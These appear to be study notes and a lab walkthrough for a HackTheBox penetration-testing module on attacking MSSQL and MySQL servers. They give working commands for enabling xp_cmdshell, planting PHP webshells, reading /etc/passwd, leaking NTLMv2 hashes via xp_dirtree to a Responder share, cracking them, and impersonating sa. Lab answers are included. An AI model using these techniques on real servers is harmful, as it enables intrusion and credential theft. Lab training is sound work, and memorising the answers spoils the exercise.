### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - SQL Database Attacks & Vulnerabilities <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking SQL Databases



MSSQL: `TCP/1433` (and `UDP/1434`); hidden mode `TCP/2433`. MySQL: `TCP/3306`.

Banner-grab MSSQL:

```diff
+ $ nmap -Pn -sV -sC -p1433 10.10.10.125
```

<br>

#### Authentication modes:

| Mode | Description |
|---|---|
| `Windows authentication mode` | Default - integrated security via Windows / AD users; pre-authed users skip extra creds |
| `Mixed mode` | Windows / AD accounts + SQL Server local user/pass auth |

[CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) - MySQL 5.6.x timing-attack auth bypass.

#### MSSQL default DBs:

- `master` - server instance config
- `msdb` - SQL Server Agent
- `model` - template DB cloned for new DBs
- `resource` - read-only system objects
- `tempdb` - temporary objects

#### MySQL default DBs:

- `mysql` - server-required tables
- `information_schema` - DB metadata
- `performance_schema` - low-level monitoring
- `sys` - DBA helpers over performance_schema

<br>

---

<br>

### Connecting to SQL Servers



MySQL connect:

```diff
+ $ mysql -u julio -pPassword123 -h 10.129.20.13
```

<br>

MSSQL via `sqlcmd` (Windows):

```diff
+ C:\> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

<br>

MSSQL via `sqsh` (Linux):

```diff
+ $ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

<br>

MSSQL via Impacket `mssqlclient.py`:

```diff
+ $ mssqlclient.py -p 1433 julio@10.129.203.7
+ $ mssqlclient.py -p 1433 -windows-auth WIN-02/mssqlsvc@10.129.203.12
```

For local Windows accounts, use `SERVERNAME\\user` or `.\\user`. For domain auth, prepend domain or hostname.

<br>

---

<br>

### SQL Syntax Cheats

#### Show / select / list:

```diff
+ mysql> SHOW DATABASES;
+ mysql> USE htbusers;
+ mysql> SHOW TABLES;
+ mysql> SELECT * FROM users;
```

<br>

#### MSSQL equivalents (terminate batch with `GO`):

```diff
+ 1> SELECT name FROM master.dbo.sysdatabases
+ 2> GO
+ 1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
+ 2> GO
```

<br>

---

<br>

### Execute Commands



MSSQL `xp_cmdshell` (disabled by default; runs with SQL service account privs):

```diff
+ 1> xp_cmdshell 'whoami'
+ 2> GO
```

<br>

Enable `xp_cmdshell` (admin priv required):

```diff
+ EXECUTE sp_configure 'show advanced options', 1
+ RECONFIGURE
+ EXECUTE sp_configure 'xp_cmdshell', 1
+ RECONFIGURE
```

<br>

MySQL has no built-in cmdshell. User Defined Functions can wrap C/C++ for command exec - see [lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys).

<br>

---

<br>

### Write Local Files



MySQL writes via `SELECT INTO OUTFILE` (constrained by `secure_file_priv`):

```diff
+ mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

<br>

Check the file-priv restriction:

```diff
+ mysql> show variables like "secure_file_priv";
```

<br>

MSSQL needs `Ole Automation Procedures` enabled to write files:

```diff
+ 1> sp_configure 'show advanced options', 1
+ 2> GO
+ 3> RECONFIGURE
+ 4> GO
+ 5> sp_configure 'Ole Automation Procedures', 1
+ 6> GO
+ 7> RECONFIGURE
+ 8> GO
```

<br>

Then write a webshell via OLE FileSystemObject:

```diff
+ 1> DECLARE @OLE INT
+ 2> DECLARE @FileID INT
+ 3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
+ 4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
+ 5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
+ 6> EXECUTE sp_OADestroy @FileID
+ 7> EXECUTE sp_OADestroy @OLE
```

<br>

---

<br>

### Read Local Files



MSSQL - read any readable file:

```diff
+ 1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+ 2> GO
```

<br>

MySQL - read with `LOAD_FILE()` (requires `FILE` priv + appropriate `secure_file_priv`):

```diff
+ mysql> select LOAD_FILE("/etc/passwd");
```

<br>

---

<br>

### Capture MSSQL Service Hash



`xp_dirtree` / `xp_subdirs` force the SQL service account to authenticate to a remote SMB share, leaking NTLMv2.

Start `responder` or `impacket-smbserver`, then:

```diff
+ 1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
+ 2> GO
+ 1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
+ 2> GO
```

<br>

Listener:

```diff
+ $ sudo responder -I tun0
+ $ sudo impacket-smbserver share ./ -smb2support
```

<br>

---

<br>

### Impersonate Existing Users (MSSQL)



Find users we can impersonate:

```diff
+ 1> SELECT distinct b.name
+ 2> FROM sys.server_permissions a
+ 3> INNER JOIN sys.server_principals b
+ 4> ON a.grantor_principal_id = b.principal_id
+ 5> WHERE a.permission_name = 'IMPERSONATE'
+ 6> GO
```

<br>

Verify current user / sysadmin role:

```diff
+ 1> SELECT SYSTEM_USER
+ 2> SELECT IS_SRVROLEMEMBER('sysadmin')
+ 3> GO
```

<br>

Impersonate (best run within `master` DB):

```diff
+ 1> EXECUTE AS LOGIN = 'sa'
+ 2> SELECT SYSTEM_USER
+ 3> SELECT IS_SRVROLEMEMBER('sysadmin')
+ 4> GO
```

<br>

Revert with `REVERT;`.

<br>

---

<br>

### Linked Servers (MSSQL)



Identify linked servers:

```diff
+ 1> SELECT srvname, isremote FROM sysservers
+ 2> GO
```

`isremote` 1 = remote, 0 = linked.

<br>

Run a query against the linked server:

```diff
+ 1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+ 2> GO
```

Use double single-quotes to escape; chain queries with `;`.

<br>

---

<br>

### Latest SQL Vulnerabilities - xp_dirtree Hash Theft



`xp_dirtree` is undocumented but lists folder contents. Pointing it at an attacker SMB share triggers SMB auth using the SQL service account context - `NTLMv2` hash is delivered to the attacker.

Attack vectors after capture:
- `Crack` the hash (Hashcat / John)
- `SMB Relay` to another host where the service account has admin
- Reuse cracked password to access the originating host

#### Concept - hash leak initiation:

| # | Step | Category |
|---|---|---|
| 1 | User input specifies the function + remote share. | `Source` |
| 2 | MSSQL processes the directory-listing request. | `Process` |
| 3 | MSSQL service runs with elevated privileges. | `Privileges` |
| 4 | SMB service is the destination of the listing request. | `Destination` |

#### Concept - hash steal (cycle restart):

| # | Step | Category |
|---|---|---|
| 5 | Forwarded SMB query is the input to the share. | `Source` |
| 6 | Share processes / requests auth. | `Process` |
| 7 | Authenticates with the SQL service account hash. | `Privileges` |
| 8 | Attacker-controlled SMB share captures the hash. | `Destination` |

<br>

---

<br>

### SQL Exercise

IP: 10.129.203.12 - auth with `htbdbuser:MSSQLAccess01!`

---

### Question 1:
What is the password for the "mssqlsvc" user?

#### Auth with given creds via Impacket `mssqlclient.py`.

```diff
+ $ mssqlclient.py -p 1433 htbdbuser@10.129.203.12
```

#### Start Responder on the tun0 interface to capture the SMB hash:

```diff
+ $ sudo responder -I tun0
```

#### Trigger `xp_dirtree` to force the SQL service account to authenticate to our share:

```diff
+ SQL> EXEC master..xp_dirtree '\\10.10.14.37\share\'
```

	[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
	[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:1917fa0270579e81:411B...

#### Crack with John:

```diff
+ $ john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
```

	princess1        (mssqlsvc)

&#x1F6A9; found **prin--edit--cess1**.

---

### Question 2:
Enumerate the "flagDB" database and submit a flag as your answer.

#### Reauth with the captured `mssqlsvc` creds via Windows auth:

```diff
+ $ mssqlclient.py -p 1433 -windows-auth WIN-02/mssqlsvc@10.129.203.12
```

#### Enumerate DBs, switch to `flagDB`, dump table:

```diff
+ SQL> select name from master.dbo.sysdatabases;
+ SQL> use flagDB
+ SQL> select * from information_schema.tables;
+ SQL> SELECT * FROM tb_flag;
```

	flagvalue
	------------------------------------
	HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}

&#x1F6A9; found **HTB{!_l0v3_#4$#!--edit--n9_4nd_r3$p0nd3r}**.
